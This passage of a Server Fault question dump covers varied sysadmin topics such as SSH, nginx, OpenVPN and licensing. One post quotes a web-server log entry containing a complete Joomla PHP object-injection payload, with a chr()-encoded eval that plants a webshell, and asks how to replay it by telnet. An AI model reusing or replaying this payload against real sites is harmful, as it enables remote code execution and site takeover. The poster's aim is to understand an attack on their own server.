/etc/ssh/ssh_config: line 26: Bad configuration option: logingracetime
/etc/ssh/ssh_config: line 27: Bad configuration option: permitrootlogin
/etc/ssh/ssh_config: line 28: Bad configuration option: strictmodes
/etc/ssh/ssh_config: line 35: Bad configuration option: ignorerhosts
/etc/ssh/ssh_config: line 44: Bad configuration option: permitemptypasswords
/etc/ssh/ssh_config: line 63: Bad configuration option: x11forwarding
/etc/ssh/ssh_config: line 64: Bad configuration option: x11displayoffset
/etc/ssh/ssh_config: line 65: Bad configuration option: printmotd
/etc/ssh/ssh_config: line 66: Bad configuration option: printlastlog
/etc/ssh/ssh_config: line 74: Bad configuration option: acceptenv
/etc/ssh/ssh_config: line 76: Bad configuration option: subsystem
/etc/ssh/ssh_config: line 87: Bad configuration option: usepam
/etc/ssh/ssh_config: terminating, 19 bad configuration options
</code></pre>
","<ubuntu><ssh><vps>","2016-06-07 15:40:31"
"993258","Best way to monitor for SSL / Connection failures on a server that's still up","<p>We had an outage issue today (NGinx not successfully restarted by our Let's Encrypt renewal CRON job, so not serving the renewed cert) leading to the server being up according to Pingdom but not serving the web service it should have been. Is there a way of monitoring for unsuccessful connection / page serving rather than whatever Pingdom is currently measuring (server response?)? We've been looking at Rollbar for exception monitoring too - can either of these services track / monitor for this kind of problem?</p>
","<linux><nginx><monitoring><ssl-certificate-errors>","2019-11-25 20:14:15"
"993309","Squid proxy has extremely slow connections when there is some load","<p>We use squid 4.9 on gentoo. Proxying https over a http proxy. It was working fine until an update in the openssl libraries, now connections are extremely slow. Please help, if you know of a way to fix this. Willing to try different solutions.</p>
","<openssl><squid><gentoo>","2019-11-26 09:12:55"
"993310","Windows Server 2019 Standard Edition Licensing for Virtual Machine on Hyper-V","<p>I have windows server 2019 standard edition installed on my host machine and with 2 additional Windows server 2019 on Hyper-V virtual environment.  Now I want to install 2 more windows 10 client VMs (Hyper-V) on same host machine.  As I have read some of the Microsoft’s articles which say that there are only 2 VMs (Hyper-V) allowed in windows server standard edition, for adding more VMs (Hyper-V) Do I need to purchase another license for Hyper-V?</p>

<p>This are the following links which I follow</p>

<p><a href=""https://download.microsoft.com/download/7/C/E/7CED6910-C7B2-4196-8C55-208EE0B427E2/Windows_Server_2019_licensing_datasheet_EN_US.pdf"" rel=""nofollow noreferrer"">https://download.microsoft.com/download/7/C/E/7CED6910-C7B2-4196-8C55-208EE0B427E2/Windows_Server_2019_licensing_datasheet_EN_US.pdf</a></p>

<p><a href=""http://www.microsoftvolumelicensing.com/Downloader.aspx?documenttype=PT&amp;lang=English"" rel=""nofollow noreferrer"">http://www.microsoftvolumelicensing.com/Downloader.aspx?documenttype=PT&amp;lang=English</a></p>

<p><a href=""https://www.microsoft.com/en-us/cloud-platform/windows-server-pricing"" rel=""nofollow noreferrer"">https://www.microsoft.com/en-us/cloud-platform/windows-server-pricing</a></p>
","<windows><virtual-machines><hyper-v><licensing><limitations>","2019-11-26 09:17:09"
"872668","What RAID controller for HP Proliant DL160 G6 for 4x3TB SATA HDDs","<p>I have HP Proliant DL160 G6 server and four 3TB SATA hard drives. Onboard controller is supporting 2TB max. I bought P410 smart array convinced it supports 3TB SATA drives, but it doesn't. I don't remember what I was looking at.</p>

<p>Anyway, I need to find right controller eventually. After my research I found P812, which according to quickspec pdf supports up to 4TB hot plug SATA and 3TB non hot plug SATA drives.</p>

<p>Could you please confirm this controller:</p>

<ul>
<li>will fit physically and electrically in DL160 G6</li>
<li>support 3TB SATA drives.</li>
</ul>

<p>Thanks</p>
","<raid><hp-proliant>","2017-09-08 10:25:20"
"872697","SSH to personal VPS through company's network that's behind firewall","<p>I've seen a lot of question mostly trying to access server that's behind firewall, but I'm trying to find the other way around where my personal server is not, but I'm at work and trying to access it on a network that's behind firewall.</p>

<p>In my <code>~/.ssh/config</code> I currently have this</p>

<pre><code>Host *
 AddKeysToAgent yes
 UseKeychain yes
 IdentityFile ~/.ssh/id_rsa

Host hostname
    HostName xxx.xxx.xx.xxx
    User username
    Port 2345
</code></pre>

<p>and when I ssh to it it will just stuck on here:</p>

<pre><code>➜  ~ ssh hostname -v
OpenSSH_7.4p1, LibreSSL 2.5.0
debug1: Reading configuration data /Users/alialdallal/.ssh/config
debug1: /Users/alialdallal/.ssh/config line 1: Applying options for *
debug1: /Users/alialdallal/.ssh/config line 6: Applying options for hostname
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Connecting to xxx.xxx.xx.xxx [xxx.xxx.xx.xxx] port 2345.
</code></pre>

<p>In my <code>fish</code> env I have these proxy set</p>

<pre><code>all_proxy=http://hostname:8000
ftp_proxy=http://hostname:8000
http_proxy=http://hostname:8000/
https_proxy=http://hostname:8000/
HTTPS_PROXY=http://hostname:8000
HTTP_PROXY=http://hostname:8000
FTP_PROXY=http://hostname:8000
ALL_PROXY=http://hostname:8000
</code></pre>

<p>What option do I need to pass or what do I need to change on my personal VPS to allow this connection through?</p>
","<ssh><proxy>","2017-09-08 13:14:52"
"993360","Re-Posting this - Terminal Server - Group Policy prevent command line [2]","<p>The actual post was here but it was an <a href=""https://serverfault.com/questions/55673/terminal-server-group-policy-prevent-command-line"">old thread</a> and I couldn't find an answer online or with the infrastructure guys from my company as most of them already left.</p>

<p>I have a Windows 2008 Terminal Server. Terminal Server Configuration(licence server, session broker, etc) is managed by group policy. If i want to disable logon via:</p>

<pre><code>change logon /disable
</code></pre>

<p>The Error Message: <code>""Connections are currently ENABLED by Group Policy for this machine, unable to change.""</code></p>

<p>Is there a smart way to fix this?</p>

<p>I would like to do this using a CMD as the company is moving towards automation but I am stuck.  I'll really appreciate a response or answer to this.</p>

<p>Thank you</p>
","<windows-server-2008><terminal-server><windows-command-prompt>","2019-11-26 16:01:06"
"993373","How do game servers communicate with master server","<p>I have multiple game servers that run separate instances of game which can accommodate 20 players each.
I want to know how game servers send information like player count, server state etc to main server (which send all game server info like ip, player count to clients).</p>
","<web-server><web-services>","2019-11-26 17:56:15"
"952024","EAP issue on Exchange 2016","<p>Today I deployed exchange 2016 based on Windows server 2012 R2 in my home lab environment. Everything was fine but when I try to create email address policy, I got following error. Then, I searched on microsoft technet forum but I didn't get solution.And I also tried to create EAP both on chrome and firefox.</p>

<p><a href=""https://i.sstatic.net/pLEEF.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/pLEEF.png"" alt=""EAP Issue""></a></p>
","<exchange-2016>","2019-02-02 15:35:45"
"872768","How can I use Intel Management Engine on Gigabyte motherboard?","<p>How can I use Intel Management Engine on Gigabyte motherboard?</p>

<p>I installed it from official Gigabyte website in drivers section for my motherboard <code>Gigabyte X299 UD4</code> but no one executable appeared after installation:</p>

<p><a href=""https://i.sstatic.net/ubs8W.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/ubs8W.png"" alt=""enter image description here""></a></p>

<p>But I can't connect to it. I can't setup it. And I can't even activate it.</p>
","<remote-desktop><remote-access><remote><drivers><intel>","2017-09-08 23:12:25"
"782807","Burn large ISO installer on multiple dual-layer DVDs","<p>Hi I have a really large ISO installer (larger than one dual-layer DVD) and is there a way to burn it onto two DVDs? Thanks.</p>
","<operating-system><iso><windows-installer>","2016-06-08 21:29:31"
"993471","How to connect a GigE camera directly to a computer?","<p>We have a GigE camera attached to our network, capturiung images from a Python program and processing them for a computer vision task. The camera receives its IP address from our DHCP server, as usual, but it would also allow to set the IP address statically.</p>

<p>Now for testing I want to attach the camera directly to a Ubuntu 18.04 based computer, like a 1:1 connection from the computer to the camera, without a network switch etc. in between. So I guess I need to setup a DHCP server on that machine, or set the IP address of the camera statically.</p>

<p>But what else do I need to talk to the GigE camera from that computer? Do I have to manually set the routes etc.?</p>
","<linux><ubuntu><networking><routing>","2019-11-27 13:56:22"
"952131","Are front and back-end SSL certificates the same?","<p>I'm trying to set up and API on https and I get the following error :</p>

<blockquote>
  <p>NET::ERR_CERT_AUTHORITY_INVALID</p>
</blockquote>

<p>I have generated the certificate using a IP address because I dont have any domain name for the server.</p>
","<linux><ssl><ssl-certificate>","2019-02-03 17:39:17"
"782836","Danger of setting the environment variable 'PATH' with a '.'?","<p>I have an upcoming test and looking at past years they always ask a similar question. Basically the security hole that would be created by setting something like:</p>

<pre><code>PATH="".:/bin:/usr/bin""
</code></pre>

<p>I get that PATH determines the absolute directories to be searched for the executable when the user calls a command such as ""ls"". I'm just not sure what behavior the above would cause.</p>

<p>It seems that it would first check the current directory (based on the '.') for a ""/bin"" directory and then move on to the absolute directory ""/usr/bin"" if there isn't one. The issue being that if a user called ""ls"" and an attacker had created a ""/bin"" in the current directory, it could contain a version of ls that for instance deletes a bunch of files.</p>

<p>Is this on the right track or am I misunderstanding the PATH notation?</p>
","<linux><hacking><environment-variables>","2016-06-09 01:07:56"
"952244","MySQL 5.7 and GDPR","<p>Hella !</p>

<p>I know how GDPR requires me to hide all personal data and make it impossible to get a match on any living person with any combination of the tables records. But any of you have experience about setting up the server itself GDPR ready? I mean I've limited the users to two (root and appadmin) and allowed both only from localhost but is there anything more I need to or should do? As for backup I'll replicate the DB with SSL but anything more I can do?</p>

<p>Thanks for the advice!</p>
","<mysql><security><gdpr>","2019-02-04 15:27:36"
"873015","Windows, IIS, Remote Desktop: after disabling insecure ciphers for ssl, I cannot login with remote desktop","<p>In the process of setting up an HTTPS website and in the best practices of it, firstly I disabled ssl v3 (no problem with that) and then I disabled older insecure ciphers and only enabled: </p>

<pre><code>TLS_RSA_WITH_AES_128_CBC_SHA
TLS_RSA_WITH_AES_256_CBC_SHA
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P256
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P384
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA_P256
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA_P384
TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA_P256
TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA_P384
TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA_P256
TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA_P384
TLS_RSA_WITH_AES_128_CBC_SHA256
TLS_RSA_WITH_AES_256_CBC_SHA256
TLS_RSA_WITH_AES_128_GCM_SHA256
TLS_RSA_WITH_AES_256_GCM_SHA384
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P256
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P384
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P256
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P384
TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P256
TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P384
TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384_P384
TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P256
TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P384
TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384_P384
</code></pre>

<p>However, after doing this, I cannot log in anymore via remote desktop. Probably some cipher incompatibility ? The RD client is on Windows XP, the server is windows 2012 R2. How can I solve this ? I don't want to re-enable older insecure ciphers for IIS.</p>

<p>Thank you in advance</p>
","<ssl><iis><windows-server-2012-r2><remote-desktop><cipher>","2017-09-11 11:03:58"
"952319","Best practices for keeping/curating organizational ops knowledge","<p>This is a somewhat broader question about a topic I think every organization/business is running into once there's more than one DevOps person: How to keep and curate organizational operations knowledge so that it remains up-to-date, easily accessible, and is useful to newcomers? </p>

<p>The goal of this question is to collect a sample of solutions for people to choose from. My business/organization hasn't (yet) found a good way of dealing with this issue.</p>

<p>Definition: Operational Knowledge -- That what is needed to know to get things done, keep the infrastructure running, and up-to-date.</p>

<p>Some Examples: What AWS regions is our main RDS cluster in? Where and how do we store our secrets? What's the loadbalancing setup for our web page? What is our role/user structure in Postgres? How is the VPN setup and what's needed to add a new user (generate certs etc.)? What are the steps to deploy a new version of code XYZ to production?</p>

<p>How does your organization handle this? Do you run your own wiki (which one?), Github's wiki, Google docs, Evernote, markdown files in a git repo, Word docs (?!?) on a central server, or what else?</p>
","<knowledge-base><manage><sysadmin>","2019-02-05 02:46:27"
"783070","Failed to resolve host: Temporary failure in name resolution","<p>I have set up a DNS server using BIND on CentOS 7. By checking the DNS server in <a href=""http://www.buddyns.com/delegation-lab/amraei.com"" rel=""nofollow noreferrer"">BuddyNS</a> and using <code>dig amraei.com</code> it seems good and working.</p>

<p>Then I have also setup Apache and a virtual host for another domain <code>involv.ir</code>. Now the domain <code>involv.ir</code> is not accessible and replying to <code>ping</code>. If I try to trace it, I get this error:</p>

<pre><code>:~$ mtr involv.ir
Failed to resolve host: Temporary failure in name resolution
</code></pre>

<p>While tracing DNS server using <code>mtr amraei.com</code> shows it's working properly. </p>

<p>How to troubleshoot this problem and check if it is DNS or Apache related?</p>
","<domain-name-system><apache-2.4>","2016-06-09 20:11:22"
"993770","Demo infrastructure faisability","<p>I would like to ask if it's possible to use an Android Phone as Hotspot and with the VPN enabled ?</p>

<p>My aim is to connect by WIFI a printer and in the other hand to have connectivity to an Azure VPN Endpoint to use a PrintServer solution into the cloud.</p>

<p>Do you thinks it's possible ?</p>

<p>Thanks in advance.
Kind regards.</p>

<p>Narglix </p>
","<azure><printing><android><endpoint>","2019-11-29 13:45:04"
"783143","CentOS 7 machine lost connectivity after DDoS attack","<p>We were testing the DDoS protection of a CentOS 7 machine but after it ended, the connection on the machine is just gone. The configuration of the connection is exactly identical to before the DDoS attack, but both inbound as well as outbound traffic does not reach the server.</p>

<pre><code>$ ping ip
PING ip (ip): 56 data bytes
Request timeout for icmp_seq 0
Request timeout for icmp_seq 1
^C
--- ip ping statistics ---
3 packets transmitted, 0 packets received, 100.0% packet loss
</code></pre>

<p>An <code>ifconfig</code> returns what it should. Also handy to know, I can't ping the gateway either. And yes, DNS servers are set and I can't ping any IP's from the server itself either.</p>

<p>I realize this isn't a lot of information, so if you need more I'll gladly add it.</p>
","<networking><centos><centos7><internet><ddos>","2016-06-10 05:39:22"
"873243","How to combine disks from XEN-hosts into one storage?","<p>We have 4 servers with XenServer 7.x installed. Each server has a large disk (6TB - raid10). How can I combine these disks in one big storage for sharing? This should be an analog of vSAN from VMware.</p>
","<xen><vsan>","2017-09-12 10:55:21"
"873246","Two websites in different servers has same cookie_domain but is not sharing session","<p>I have two different sites that has their own server. Site#2 sends request to Site#1 for logging customer in. Request contains Allow Crendentials Header and response is status 200. Both sites has same memcache COOKIE_DOMAIN but for some reason Site#2 has no set $_SESSION values. What did I miss?</p>
","<session><memcache><cookie>","2017-09-12 11:05:25"
"952428","How can i download my aws key file?","<p>I asked a freelancer to migrate the website from staging to live server and they perform the migration, but now I want to back up the files and DB I need a pem file, which the freelancer never gave me. 
What do I do? I don't know the FTP details also.
How can I backup my website files and DB?
The website is hosted on aws Ec2-Linux?</p>
","<amazon-web-services><amazon-ec2><backup>","2019-02-05 17:16:12"
"873357","OpenVPN not redirecting all traffic to VPN tunnel when local network is 192.168.x on both sides","<p>I've setup a OpenVPN server using tun and udp and enabled the options for redirecting all internet traffic and pushing lan to clients.</p>

<p>In the HOST NETWORK The OpenVPN Server is configured to dish out 10.8.0.x network addresses for OpenVPN clients where as the LAN clients are in the 192.168.x network.</p>

<p>It looks something like this.</p>

<pre><code>-----------------------------------------
|            HOST NETWORK               |
|     LAN Clients    +  OpenVPN Server  |
|     192.168.1.x          10.8.0.x     |
-----------------------------------------
                     |
            -------------------
            |     INTERNET     |
            -------------------
                     |
 ----------------------------------------
 |           REMOTE NETWORK             |
 |          OpenVPN Clients             |
 |      Local Network 192.168.1.x       |
 ----------------------------------------
</code></pre>

<p>The problem is when the REMOTE NETWORK OpenVPN client are connecting from a remote network but they themselves have a local address range of 192.168.1.x</p>

<p>In this scenario not all packets are sent over the tunnel. e.g. If the REMOTE NETWORK has a machine at 192.168.1.1 and after establishing the OpenVPN tunnel the remote OpenVPN client tries to access 192.168.1.1 it goes to the REMOTE NETWORK's machine rather than the HOST NETWORK's machine.</p>

<p>How do I tell/configure the remote OpenVPN client to send ALL traffic over the tunnel ignoring whatever the local network routes/addresses are?</p>

<p>I've searched all over and tried the remote-gateway def1/autolocal options but nothing seems to work, it's always sending the 192.168.1.1 packets to the REMOTE NETWORK machine instead of the HOST NETWORK machine.</p>

<p>This is my client config:</p>

<pre><code>client
dev tun
proto udp
remote hostnetwork.com 1194
float
ncp-ciphers AES-128-GCM:AES-256-GCM:AES-128-CBC:AES-256-CBC
cipher AES-128-CBC
comp-lzo adaptive
keepalive 15 60
auth-user-pass
remote-cert-tls server
&lt;ca&gt;
-----BEGIN CERTIFICATE-----
-----END CERTIFICATE-----
&lt;/ca&gt;
resolv-retry infinite
nobind
redirect-gateway autolocal
</code></pre>
","<openvpn><redirect><traffic><tunnel>","2017-09-12 22:20:16"
"993963","One time password sharing over local network","<p>I am responsible for the security of a company where passwords are currently stored locally with a password manager, but if another employee needs a password, they are shared via cloud based programs like Slack or Teams, which I want to prevent.</p>

<p>My idea was a local server that removes messages once they have been read or stored for more than 1 minute. (I don't want a network-based password storage, just a way to securely share passwords over the network.)</p>

<p>Does anyone have recommendations/experience with such software or is the idea generally stupid?</p>
","<networking><security><file-sharing>","2019-12-02 06:56:54"
"783266","A domain controller in Azure ends up public on the Internet with no firewall - is it compromised?","<p>I'm helping a customer stand up an Azure environment and they decided to stand up a server (DC) on their own without asking for help. </p>

<p>The only access method is supposed to be IPsec, but they forgot to disable the Azure-assigned public IP while standing up the server, so their DC ended up public on the Internet with no firewall whatsoever - including Windows Firewall (disabled while troubleshooting other networking/replication issues).</p>

<p>The symptoms that led to this discovery were random account lockouts originating from Chinese IP addresses in the Security log on the domain controller.</p>

<p>I've since fixed the situation by re-enabling Windows Firewall, creating an Azure security group, and deleting the public IP so that it's secured by IPsec. I also recommended they just decommission that server entirely and spin up a new one.</p>

<p>But I'm still curious - what attack surfaces are there for a domain controller that has no firewall whatsoever on the open Internet? If they decide not to decommission it, is there anything to look for in terms of compromise?</p>
","<networking><active-directory><security><azure><domain-controller>","2016-06-10 16:23:20"
"993968","Windows Server 2019 - lost all computer from OU?","<p>I keep computer accounts (Computers) in two separate OU units in Active Directory structure. This morning I had to add some users, and noticed that all machines are missing from their corresponding OU.</p>

<p>When I searched, they were found, but I can't see them anywhere else.</p>

<p>What should I do to amend this?</p>
","<entra-id><windows-server-2019><organizational-unit>","2019-12-02 07:39:43"
"873365","Source vs Static Network Address Translation","<p>Terminology in my research makes it unclear whether Source NAT(SNAT) and Static NAT(also SNAT) are the same concept and/or what would noteable differences or advantages of either be?</p>
","<nat>","2017-09-13 00:20:28"
"952527","Why would a website say it's running on nginx through telnet, but say Apache through directory browsing?","<p>Running ""telnet website.com 80 HEAD / HTTP/1.0"" claims that the server is nginx/1.14.1, however directory browsing is enabled on the site and visiting it clearly says ""Apache Server at website.com Port 80"". What could cause this?</p>
","<nginx><apache-2.4>","2019-02-06 05:32:41"
"993989","File is re-creating automatically on change","<p>I have a weird problem on server after the attack. In the web folder I have the <code>index.php</code> with malicious content. When I try to delete, rename it or change its content it is re-created somehow.</p>

<p>I checked crontab and ps but I haven't found anything suspicious.</p>

<p>Also it is very interesting that if I change the owner of the file to root it is still re-creating without any problem. </p>

<p>Server system name and version: Debian GNU/Linux 8 (jessie)</p>
","<php><debian><apache2>","2019-12-02 10:53:22"
"783328","Looking to mimic Netgear Nighthawk AC1900 Router Settings in a TP-Link MR3040 Router","<p>I have a Netgear Nighthawk AC1900 Router that is setup and working correctly with a network that has two Wifi cameras and a Linux PC acting as a server.</p>

<p>Static IP addresses have been assigned to both WiFi cameras and the Linux PC in the Netgear Router:</p>

<p><a href=""https://i.sstatic.net/38fWX.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/38fWX.png"" alt=""enter image description here""></a></p>

<p>The router is using a Cat5 ethernet cable for two way communication for the Linux PC that is acting as a server:</p>

<p><a href=""https://i.sstatic.net/gD72M.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/gD72M.jpg"" alt=""enter image description here""></a></p>

<p>Now I am trying to replace the Netgear Nighthawk router with a battery powered TP-LINK Router:</p>

<p><a href=""https://i.sstatic.net/1OT1h.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/1OT1h.jpg"" alt=""enter image description here""></a></p>

<p>I have matched the Static IP address assignment of the Linux PC and two Wifi cameras in Netgear Nighthawk Router to the TP-LINK router settings:</p>

<p><a href=""https://i.sstatic.net/u8StM.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/u8StM.png"" alt=""enter image description here""></a></p>

<p>The network setup is not working though, I do not know what other settings I might need to match from the Netgear Nighthawk router to the TC-LINK router.</p>

<p>I also do not know if the one ethernet port on the TC-LINK router will allow two way direction communication of the Cat5 cable hooked up between the Linux PC and the TC-Link wireless router so that my Linux PC can continue to act as a server on this network like it works on the Netgear Night router.</p>
","<ip><router><static-ip><netgear><tp-link>","2016-06-10 23:06:52"
"783332","Try to Test Hack Attempt with Telnet","<p>My server recently was attacked by hackers trying to run code on a web site, and I would like to test what they there trying to do. I'm not sure how to build the telnet command to do this.</p>

<pre><code>2016-06-09 17:02:11 192.168.1.1 GET / - 80 - 176.31.245.146 }__test|O:21:""JDatabaseDriverMysqli"":3:{s:2:""fc"";O:17:""JSimplepieFactory"":0:{}s:21:""\0\0\0disconnectHandlers"";a:1:{i:0;a:2:{i:0;O:9:""SimplePie"":5:{s:8:""sanitize"";O:20:""JDatabaseDriverMysql"":0:{}s:8:""feed_url"";s:870:""eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(36).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(91).chr(39).chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84).chr(39).chr(93).chr(46).chr(39).chr(47).chr(105).chr(110).chr(99).chr(108).chr(117).chr(100).chr(101).chr(115).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(64).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(116).chr(111).chr(109).chr(93).chr(41).chr(63).chr(62).chr(32).chr(60).chr(112).chr(112).chr(112).chr(112).chr(112).chr(112).chr(112).chr(112).chr(62).chr(39).chr(41).chr(59));JFactory::getConfig();exit"";s:19:""cache_name_function"";s:6:""assert"";s:5:""cache"";b:1;s:11:""cache_class"";O:20:""JDatabaseDriverMysql"":0:{}}i:1;s:4:""init"";}}s:13:""\0\0\0connection"";b:1;}𽽽 - 200 0 0 2609

date: 2016-06-09
time: 17:02:11
s-ip: 192.168.1.1.
cs-method: GET
cs-uri-stem: /
cs-uri-query: -
s-port: 80
cs-username: -
cs-ip: 176.31.245.146
cs(User-Agent): }__test|O:21:""JDatabaseDriverMysqli"":3:{s:2:""fc"";O:17:""JSimplepieFactory"":0:{}s:21:""\0\0\0disconnectHandlers"";a:1:{i:0;a:2:{i:0;O:9:""SimplePie"":5:{s:8:""sanitize"";O:20:""JDatabaseDriverMysql"":0:{}s:8:""feed_url"";s:870:""eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(36).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(91).chr(39).chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84).chr(39).chr(93).chr(46).chr(39).chr(47).chr(105).chr(110).chr(99).chr(108).chr(117).chr(100).chr(101).chr(115).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(64).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(116).chr(111).chr(109).chr(93).chr(41).chr(63).chr(62).chr(32).chr(60).chr(112).chr(112).chr(112).chr(112).chr(112).chr(112).chr(112).chr(112).chr(62).chr(39).chr(41).chr(59));JFactory::getConfig();exit"";s:19:""cache_name_function"";s:6:""assert"";s:5:""cache"";b:1;s:11:""cache_class"";O:20:""JDatabaseDriverMysql"":0:{}}i:1;s:4:""init"";}}s:13:""\0\0\0connection"";b:1;}𽽽
cs(Referer): -
sc-status: 200
sc-substatus: 0
sc-win32-status: 0 
time-taken: 2609
</code></pre>

<p>The eval code decodes to this:</p>

<pre><code>&lt;?php fputs(fopen($_SERVER['DOCUMENT_ROOT'] . '/includes.php', 'w'), '&lt;?php eval($_POST[tom])?&gt; &lt;pppppppp&gt;');
</code></pre>

<p>How do I make a telnet command using this information?</p>

<p>Thanks.</p>
","<php><hacking><telnet>","2016-06-11 00:00:08"
"952593","What is the purpose of ""X-NginX-Proxy""","<p>Many <a href=""https://www.google.com/search?q=%22X-NginX-Proxy%22&amp;oq=%22X-NginX-Proxy%22"" rel=""nofollow noreferrer"">examples</a> around the internet is using ""X-NginX-Proxy""</p>

<p>Nowhere can I find a proper description of its purpose or why one would use it, apart from that it relates to using nginx as a proxy?</p>

<p>Example:</p>

<pre><code>server {
listen 80;

server_name forum.example.org;

location / {
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header Host $http_host;
    proxy_set_header X-NginX-Proxy true;
...
</code></pre>
","<nginx>","2019-02-06 13:11:37"
"994070","Telnet not working with windows 10","<p>I am using telnet on windows 10. I would like to manually set <code>get</code> requests to chosen server.</p>

<p>If I type (just example it can be any site):</p>

<pre><code>telnet www.cnn.com 80
</code></pre>

<p>for a second I see message 'connecting to www.cnn.com'. Text on the page then disappears (nothing is shown, just cursor). Whatever I try to type, message of 'bad request' is immediately shown from the server.</p>

<p>Why is that? Why - after connection is established with server - is this not shown? Something like 'connected to www.cnn.com' and telnet commands enabled?</p>
","<telnet>","2019-12-03 01:34:43"
"952610","Running processes: ""perl /tmp/dd"" - what is this?","<p>I have a LAMP server with about 50 virtual domains, and am using Webmin/Virtualmin to manage the server. </p>

<p>When looking at running processes (<code>top</code>) I see one domain's username is running a couple of perl processes, and <code>ps</code> gives me the full command line:  <code>perl /tmp/dd</code>.  Note that this domain is a wordpress installation.</p>

<p>There is no <code>dd</code> file in the /tmp directory, so I can't tell what it's doing.  These processes have been running for about 3 days.  I can't kill them with standard <code>kill [pid]</code>, but must use <code>kill -9</code>. </p>

<p>Is this an exploit, or is it most likely part of webmin/virtualmin's maintenance scripts?</p>
","<perl><webmin><exploit><virtualmin>","2019-02-06 14:51:03"
"783397","what is difference between Java script and c#?","<p>I have some doubt on that can u please give answer for that ? Java script no need compiler but for c# we need compiler to run.Please give answer for above question ?</p>
","<.net>","2016-06-11 13:22:07"
"952635","Why is Nginx displaying a ""502 Bad Gateway Error""?","<p>I'm trying to create a PyPI  (Python) package repository on a Debian 8 server running Nginx 1.6.2.  I want to make all the files in a particular directory tree available for downloading to my other servers via HTTP.  My Python packages are all kept in the /var/www/packages directory:</p>

<pre><code>/var/www/packages
/var/www/packages/Django-1.8.4-py2.py3-none-any.whl
/var/www/packages/simple
/var/www/packages/simple/index.html
/var/www/packages/simple/django
/var/www/packages/simple/django/Django-1.8.4-py2.py3-none-any.whl -&gt; ../../Django-1.8.4-py2.py3-none-any.whl
</code></pre>

<p>If I try to read my packages directory from another server using curl, I get the following error:</p>

<pre><code>$ curl -I http://example.com/packages/simple/django/Django-1.8.4-py2.py3-none-any.whl
$ HTTP/1.1 502 Bad Gateway
</code></pre>

<p>If I just try to display the Nginx default home page, I'm getting the same error:</p>

<pre><code>502 Bad Gateway
</code></pre>

<p>The /var/log/nginx/error.log file shows this error in either case:</p>

<pre><code>2019/02/06 00:53:52 [alert] 3736#0: 768 worker_connections are not enough
2019/02/06 00:53:52 [error] 3736#0: *765 recv() failed (104: Connection reset by peer) while reading response header from upstream, client: 127.0.0.1, server: example.com, request: ""GET / HTTP/1.0"", upstream: ""http://127.0.0.1:80/"", host: ""example.com:80""
</code></pre>

<p>Here is my Nginx configuration file:</p>

<pre><code>upstream pypi {
  server            127.0.0.1   fail_timeout=0;
}

server {
  server_name       example.com;
  root          /var/www/packages;

  location / {
    proxy_set_header    Host $host:$server_port;
    proxy_set_header    X-Forwarded-Proto $scheme;
    proxy_set_header    X-Real-IP $remote_addr;
    proxy_pass      http://pypi;          # &lt;- Error here
  }
}
</code></pre>

<p>As I understand it, this error means that Nginx, which is acting as a proxy, is trying to relay information from another server but has received a bad response from that server.  But in this situation, I'm merely trying to make a directory tree on the proxy server available via HTTP so, strictly speaking, there is no other server.</p>

<p>To troubleshoot the problem, I commented out the root directive and the entire location block.  When I did this, the 502 error went away and I could at least see the default Nginx home page. Then I began uncommenting each directive each directive in the location block, one at a time.  By doing this, I found that I could continue to see the Nginx page if I uncommented the entire location block except for the proxy_pass directive.  That proxy_pass line is what's causing the problem.  What does proxy_pass have to be set to in a situation like this?  And do I set root to /var/www/packages since that's the root directory for my packages?</p>
","<nginx><python><django>","2019-02-06 17:01:26"
"873592","Configure VMware to use VPN","<p>I have a W10 machine running VMware. On VMWare I have a CentOS installation. Is it possible to configure the VM to use a VPN and my host machine just use my regular connection?</p>

<p>Thanks</p>
","<vpn><virtual-machines>","2017-09-14 09:13:48"
